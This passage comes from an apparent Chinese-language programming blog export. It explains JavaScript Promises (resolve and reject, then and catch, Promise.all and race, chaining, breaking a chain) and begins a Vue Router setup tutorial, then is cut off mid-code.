class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>            <span class="hljs-keyword">let</span> n = rand(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>            <span class="hljs-comment">//进入判断</span><br>            <span class="hljs-keyword">if</span>(n &lt;= <span class="hljs-number">50</span>)&#123;<br>                resolve()<span class="hljs-comment">//将promise对象的状态设置为-成功</span><br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                reject()<span class="hljs-comment">//将promise队形的状态设置为-失败</span><br>            &#125;<br>        &#125;,<span class="hljs-number">1000</span>);<br>    &#125;)<br><br>    <span class="hljs-comment">//调用then方法</span><br>    p.then(<span class="hljs-function">() =&gt;</span>&#123;<span class="hljs-comment">//resolve调用</span><br>        alert(<span class="hljs-string">&#x27;恭喜中奖&#x27;</span>)<br>    &#125;,<span class="hljs-function">()=&gt;</span>&#123;<span class="hljs-comment">//reject调用</span><br>        alert(<span class="hljs-string">&#x27;再接再厉&#x27;</span>);<br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>1.Promise的实例对象需要创建，其中包含了我们的异步任务</p><p>2.Promise实例化后用过then方法运行，实现触发回调</p><p>但是如果我们想知道自己的中奖号码是多少怎么办呢？</p><p>还记得resolve和reject这两个函数吗？我们就用这两个函数传参</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">50</span>) &#123;<br>    resolve(n)<span class="hljs-regexp">//</span>将promise对象的状态设置为-成功<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    reject(n)<span class="hljs-regexp">//</span>将promise队形的状态设置为-失败<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">p.<span class="hljs-keyword">then</span>(<span class="hljs-function"><span class="hljs-params">(value)</span> =&gt;</span> &#123;//resolve调用，参数叫value<span class="hljs-comment">--成功的值</span><br>    alert(<span class="hljs-string">&#x27;恭喜中奖,号码为&#x27;</span> + value)<br>&#125;, <span class="hljs-function"><span class="hljs-params">(reason)</span> =&gt;</span> &#123;//reject调用，参数叫reason<span class="hljs-comment">--失败的原因</span><br>    alert(<span class="hljs-string">&#x27;再接再厉&#x27;</span> + reason);<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="3-2-读取文件"><a href="#3-2-读取文件" class="headerlink" title="3.2.读取文件"></a>3.2.读取文件</h3><p>在原生js中我们读取文件的方式是使用fs模块</p><p>原生：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//引入fs模块</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.readFile(<span class="hljs-string">&#x27;./resource/content.txt&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">err,data</span>)=&gt;</span>&#123;<br>    <span class="hljs-comment">//出错</span><br>    <span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">throw</span> err;<br>    <span class="hljs-comment">//输出文件</span><br>    <span class="hljs-built_in">console</span>.log(data.toString())<br>&#125;);<br></code></pre></td></tr></table></figure><p>同样，这样子的异步问题，我们依然可以使用Promise解决</p><p>Promise：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">let</span> p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve , reject</span>)=&gt;</span>&#123;<br>    fs.readFile(<span class="hljs-string">&#x27;./resource/content.txt&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">err,data</span>)=&gt;</span>&#123;<br>        <span class="hljs-comment">//出错</span><br>        <span class="hljs-keyword">if</span>(err) reject(err)<br>        <span class="hljs-comment">//成功回调</span><br>        resolve(data)<br>    &#125;)<br>&#125;)<br><span class="hljs-comment">//调用then</span><br>p.then(<span class="hljs-function"><span class="hljs-params">value</span>=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(value.toString())<span class="hljs-comment">//不加toString那么得到的就会是数字码</span><br>&#125;,<span class="hljs-function"><span class="hljs-params">reason</span>=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(reason)<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="3-3-发送Ajax请求"><a href="#3-3-发送Ajax请求" class="headerlink" title="3.3.发送Ajax请求"></a>3.3.发送Ajax请求</h3><p>现在问题来到了Ajax身上，Ajax同样也是一个异步操作，我们用Promise进行封装</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs lisp">const p = new Promise((<span class="hljs-name">reslove</span>, reject) =&gt; &#123;<br>    btn.addEventListener(&#x27;click&#x27;, function () &#123;<br>        const xhr = new XMLHttpRequest()<br>        xhr.open(&#x27;GET&#x27;, &#x27;https<span class="hljs-symbol">://api</span>.apiopen.top/getJoke&#x27;)<br>        xhr.send()<br>        //处理结果<br>        xhr.onreadystatechange = function () &#123;<br>            if (<span class="hljs-name">xhr</span>.readyState === <span class="hljs-number">4</span>) &#123;<br>                if (<span class="hljs-name">xhr</span>.status &gt;= <span class="hljs-number">200</span> <span class="hljs-symbol">&amp;&amp;</span> xhr.status &lt; <span class="hljs-number">300</span>) &#123;<br>                    reslove(<span class="hljs-name">xhr</span>.response)<br>                &#125;else&#123;<br>                    reject(<span class="hljs-name">xhr</span>.status)<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>以后会有axios给我们使用，axios就是promise风格的发送Ajax请求的方法</p><h3 id="3-4-自动封装函数Promisify"><a href="#3-4-自动封装函数Promisify" class="headerlink" title="3.4.自动封装函数Promisify"></a>3.4.自动封装函数Promisify</h3><p>如果对函数进行promise封装每次都要我们手写，那实在是十分不妥</p><p>接下来我们引入 util 模块中的promisify方法，帮助我们实现自动封装</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//引入util</span><br><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>)<br><span class="hljs-comment">//引入fs</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-comment">//返回一个新函数,将readFile封装成promise风格</span><br><span class="hljs-keyword">let</span> readMyFile = util.promisify(fs.readFile)<br><br>readMyFile(<span class="hljs-string">&#x27;./resource/content.txt&#x27;</span>).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(value.toString());<br>&#125;)<br></code></pre></td></tr></table></figure><p>非常好用！</p><h3 id="3-5-promise对象的状态"><a href="#3-5-promise对象的状态" class="headerlink" title="3.5.promise对象的状态"></a>3.5.promise对象的状态</h3><p>Promise实例对象中会有一个状态属性——PromiseState</p><p>这个属性有三个可能值：1.pending（未决定的）2.resolved/fullfilled（正确状态）3.rejected（错误状态）</p><p>这些属性之间的转换：只能是由padding转化为resolved或者rejected</p><p>通过resolve，reject，throw改变状态</p><h3 id="3-6-promise对象的结果"><a href="#3-6-promise对象的结果" class="headerlink" title="3.6.promise对象的结果"></a>3.6.promise对象的结果</h3><p>Promise实例对象中会有一个结果属性——PromiseResult</p><p>这个属性存着Promise对象的结果</p><p>改变这个结果只能通过resolve和reject两个方法进行改变</p><h2 id="4-Promise的API"><a href="#4-Promise的API" class="headerlink" title="4.Promise的API"></a>4.Promise的API</h2><h3 id="4-1-execator和catch"><a href="#4-1-execator和catch" class="headerlink" title="4.1.execator和catch"></a>4.1.execator和catch</h3><p>execator代表我们(resolve,reject) =&gt; {} 中的内容，它和我们的const p 是同步调用的，也就是这里面的代码是会立即执行的</p><p>catch是Promise对象的对于失败的回调，类似于我们的then ，但是它只管理失败回调</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-keyword">let</span> p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;111&#x27;</span>);</span><br><span class="javascript">        reject(<span class="hljs-string">&#x27;error&#x27;</span>)</span><br><span class="javascript">    &#125;)</span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">222</span>);</span><br><span class="javascript">    p.catch(<span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;</span><br><span class="javascript">        <span class="hljs-built_in">console</span>.log(reason);</span><br><span class="javascript">    &#125;)</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里的输出顺序是</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">111</span><br><span class="hljs-number">222</span><br><span class="hljs-keyword">error</span><br></code></pre></td></tr></table></figure><h3 id="4-2-resolve"><a href="#4-2-resolve" class="headerlink" title="4.2 resolve"></a>4.2 resolve</h3><p>resolve是一个Promise下的方案，使用<code>Promise.reslove()</code>调用与以往new Promise的调用不同</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-regexp">//</span>传入的参数是一个非<span class="hljs-built_in">Promise</span>的值,得到一个fulfilled的<span class="hljs-built_in">Promise</span>对象<br>let p = <span class="hljs-built_in">Promise</span>.resolve(<span class="hljs-number">521</span>)<br><span class="hljs-built_in">console</span>.log(p)<br><span class="hljs-regexp">//</span>传入参数是一个<span class="hljs-built_in">Promise</span>对象，得到和传入<span class="hljs-built_in">Promise</span>对象相同的<span class="hljs-built_in">Promise</span>对象<br>let q = <span class="hljs-built_in">Promise</span>.resolve(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(resolve,reject)</span>=&gt;</span>&#123;<br>    reject(<span class="hljs-string">&quot;err&quot;</span>)<br>&#125;))<br><span class="hljs-regexp">//</span>消除报错<br>q.<span class="hljs-keyword">catch</span>(reason =&gt; &#123;<br>    <span class="hljs-built_in">console</span>.log(reason);<br>&#125;)<br><span class="hljs-regexp">//</span>这里是rejected状态的<span class="hljs-built_in">Promise</span>对象<br><span class="hljs-built_in">console</span>.log(q)<br></code></pre></td></tr></table></figure><p>唯一需要注意的是传入的参数为Promise对象时的情况</p><h3 id="4-3-rejecte"><a href="#4-3-rejecte" class="headerlink" title="4.3 rejecte"></a>4.3 rejecte</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">let</span> r = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promise</span>.</span></span>reject(<span class="hljs-number">521</span>)<br><span class="hljs-keyword">let</span> j = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promise</span>.</span></span>reject(<span class="hljs-keyword">new</span> <span class="hljs-constructor">Promise((<span class="hljs-params">resolve</span>,<span class="hljs-params">reject</span>)</span>=&gt;&#123;<br>    resolve(<span class="hljs-string">&quot;OK&quot;</span>)<br>&#125;))<br><span class="hljs-comment">//返回的Promise对象依然失败，失败的原因是我们传入的Promise对象</span><br>console.log(j);<br></code></pre></td></tr></table></figure><p>与resolve不同的是，即使给reject传入一个成功的Promise对象，所返回的Promise对象状态依然是rejected</p><h3 id="4-4-all"><a href="#4-4-all" class="headerlink" title="4.4 all"></a>4.4 all</h3><p>当我们有多个Promise对象的时候，使用我们的all方案</p><p>all方法参数可以是一个Promise数组，只要数组中有一个失败Promise那么返回的Promise就会失败，多个失败结果只会返回第一个查找到的失败结果值</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">let</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Promise((<span class="hljs-params">resolve</span>, <span class="hljs-params">reject</span>)</span> =&gt; &#123;<br>    resolve(<span class="hljs-string">&quot;ok&quot;</span>)<br>&#125;)<br><span class="hljs-keyword">let</span> p2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promise</span>.</span></span>resolve(<span class="hljs-string">&quot;right&quot;</span>)<br><span class="hljs-keyword">let</span> p3 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promise</span>.</span></span>reject(<span class="hljs-string">&quot;err&quot;</span>)<br>const all = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promise</span>.</span></span>all(<span class="hljs-literal">[<span class="hljs-identifier">p1</span>, <span class="hljs-identifier">p2</span>, <span class="hljs-identifier">p3</span>]</span>)<br>console.log(all);<br></code></pre></td></tr></table></figure><p>得到的结果是一个原因为<code>err</code>，状态为<code>rejected</code>的Promise对象</p><h3 id="4-5-race"><a href="#4-5-race" class="headerlink" title="4.5 race"></a>4.5 race</h3><p>也是传入一个数组作为参数，返回第一个改变状态的Promise对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> r1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        resolve(<span class="hljs-string">&quot;ok&quot;</span>)  <br>    &#125;, <span class="hljs-number">1000</span>);<br>&#125;)<br><span class="hljs-keyword">let</span> r2 = <span class="hljs-built_in">Promise</span>.resolve(<span class="hljs-string">&quot;right&quot;</span>)<br><span class="hljs-keyword">let</span> r3 = <span class="hljs-built_in">Promise</span>.reject(<span class="hljs-string">&quot;err&quot;</span>)<br><span class="hljs-comment">//返回第一个改变结果的Promise对象-r2</span><br><span class="hljs-keyword">const</span> race = <span class="hljs-built_in">Promise</span>.race([r1,r2,r3])<br><span class="hljs-built_in">console</span>.log(race);<br></code></pre></td></tr></table></figure><p>这里因为r1延迟resolve了，所以race中第一个改变的对象是r2</p><h3 id="4-6-then方法的返回结果"><a href="#4-6-then方法的返回结果" class="headerlink" title="4.6 then方法的返回结果"></a>4.6 then方法的返回结果</h3><p>then方法的返回结果是一个Promise对象，对象的PromiseState和PromiseResult与传入的参数有关</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">let p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(resolve,reject)</span>=&gt;</span>&#123;<br>    resolve(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>&#125;)<br>let result = p.<span class="hljs-keyword">then</span>(value =&gt; &#123;<br>    <span class="hljs-regexp">//</span>第一种返回<span class="hljs-keyword">throw</span>  得到错误对象<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;err&quot;</span><br>    <span class="hljs-regexp">//</span>第二次返回非<span class="hljs-built_in">Promise</span>对象 得到成功对象<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">return</span> <span class="hljs-number">521</span><br>    //第三次返回<span class="hljs-built_in">Promise</span>对象 得到<span class="hljs-built_in">Promise</span>状态和原因<br>    <span class="hljs-keyword">return</span>  <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(resolve,reject)</span> =&gt;</span>&#123;<br>        resolve(<span class="hljs-string">&quot;right&quot;</span>)<br>    &#125;)<br>&#125;,<br>reason =&gt; &#123;<br><br>&#125;) <br><span class="hljs-built_in">console</span>.log(result);<br></code></pre></td></tr></table></figure><h3 id="4-7-Promise串联任务"><a href="#4-7-Promise串联任务" class="headerlink" title="4.7 Promise串联任务"></a>4.7 Promise串联任务</h3><p>使用then的链式调用串联任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>    resolve(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>&#125;)<br><span class="hljs-keyword">let</span> result = p.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">//第一种返回throw  得到错误对象</span><br>    <span class="hljs-comment">// throw &quot;err&quot;</span><br>    <span class="hljs-comment">//第二次返回非Promise对象 得到成功对象</span><br>    <span class="hljs-comment">// return 521</span><br>    <span class="hljs-comment">//第三次返回Promise对象 得到Promise状态和原因</span><br>    <span class="hljs-keyword">return</span>  <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>) =&gt;</span>&#123;<br>        resolve(<span class="hljs-string">&quot;right&quot;</span>)<br>    &#125;).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>        <span class="hljs-built_in">console</span>.log(value);<br>    &#125;).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>        <span class="hljs-built_in">console</span>.log(value);<br>    &#125;)<br>&#125;,<br><span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br><br>&#125;) <br><span class="hljs-built_in">console</span>.log(result);<span class="hljs-comment">//得到一个state为fulfilled，result为undefined的对象</span><br></code></pre></td></tr></table></figure><h3 id="4-8-异常穿透"><a href="#4-8-异常穿透" class="headerlink" title="4.8 异常穿透"></a>4.8 异常穿透</h3><p>在串联任务中我们不需要每个then都指定失败的回调</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    reject(<span class="hljs-string">&#x27;err&#x27;</span>)<br>&#125;) <br>p.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">111</span>);<br>&#125;).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">222</span>);<br>&#125;).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">333</span>);<br>&#125;).catch(<span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(reason);<br>&#125;)<br></code></pre></td></tr></table></figure><p>只要发生了异常，就会触发catch的失败回调</p><h3 id="4-9-中断链式"><a href="#4-9-中断链式" class="headerlink" title="4.9 中断链式"></a>4.9 中断链式</h3><p>中断链式需要then方法返回一个pending状态的promise对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>     resolve(<span class="hljs-string">&#x27;err&#x27;</span>)<br> &#125;) <br> p.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>     <span class="hljs-built_in">console</span>.log(<span class="hljs-number">111</span>);<br>     <span class="hljs-comment">//返回一个pending类型的promise对象时中断链式</span><br>     <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">() =&gt;</span>&#123;&#125;)<br> &#125;).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span>&#123;<br>     <span class="hljs-built_in">console</span>.log(<span class="hljs-number">222</span>);<br> &#125;).then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span>&#123;<br>     <span class="hljs-built_in">console</span>.log(<span class="hljs-number">333</span>);<br> &#125;).catch(<span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span>&#123;<br>     <span class="hljs-built_in">console</span>.log(reason);<br> &#125;)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Promise</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Promise</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Route</title>
    <link href="/2022/05/19/%E8%B7%AF%E7%94%B1/"/>
    <url>/2022/05/19/%E8%B7%AF%E7%94%B1/</url>
    
    <content type="html"><![CDATA[<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><h2 id="1-什么是路由"><a href="#1-什么是路由" class="headerlink" title="1. 什么是路由"></a>1. 什么是路由</h2><p>简单定义：1.route（路由）是<strong>一组key-value的对应关系</strong>（key是组件，value是组件或者函数《后端路由-node.js》）</p><p>​                  2.多个路由<strong>需要经过router（路由器）的管理</strong></p><p>路由就是为了实现SPA（single page web application）应用—单页面应用</p><p>我们转换页面时，<strong>只进行局部的更新，不刷新，同时改变路径</strong></p><p> <strong>vue-router是vue的一个插件库，通过Vue.use()使用</strong></p><p><img src="https://s2.loli.net/2022/06/20/XIyfN5ovzVMTPgb.png" alt="路由图示.png"></p><p>我们的路由就是一组组的对应关系，不同的路径，路由规则，展示不同的组件</p><h2 id="2-路由的基本使用"><a href="#2-路由的基本使用" class="headerlink" title="2.路由的基本使用"></a>2.路由的基本使用</h2><p>路由所实现的就是一个单页面应用的组件切换效果，那在使用前我们需要先安装router</p><h3 id="1-router的安装和基本配置"><a href="#1-router的安装和基本配置" class="headerlink" title="1.router的安装和基本配置"></a>1.router的安装和基本配置</h3><p>在控制台中输入：<code>npm i vue-router</code>(如果你是vue3，那么安装默认的4版本就好了)</p><p>如果你是vue2 就需要安装3版本 :<code>npm i vue-router@3</code></p><p>然后和其他插件一样，我们在main.js中引入，并使用–Vue.use()，然后加入vm配置项中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-comment">//引入路由</span><br><span class="hljs-keyword">import</span> VueRouter <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vue-router&quot;</span>;<br><span class="hljs-comment">//引入路由器</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><br>Vue.config.productionTip = <span class="hljs-literal">false</span><br>Vue.use(VueRouter)<br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> h(App),<br>    <span class="hljs-attr">router</span>:  router<br>&#125;)<br></code></pre></td></tr></table></figure><p>和vuex一样，router也需要一个js文件来写逻辑，我们在src下新建一个文件夹（router）写入文件（index.js）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//引入组件和路由</span><br><span class="hljs-keyword">import</span> About <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/About&#x27;</span><br><span class="hljs-keyword">import</span> Home <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/Home&#x27;</span><br><span class="hljs-keyword">import</span> vueRouter <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> vueRouter(&#123;<br>    <span class="hljs-attr">routes</span>: [<span class="hljs-comment">//配置我们一组组的key-value关系</span><br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/about&#x27;</span>,<span class="hljs-comment">//切换的路径</span><br>            <span class="hljs-attr">component</span>: About<span class="hljs-comment">//对应的组件</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/home&#x27;</span>,<br>            <span class="hljs-attr">component</span>: Home<br>        &#125;<br>    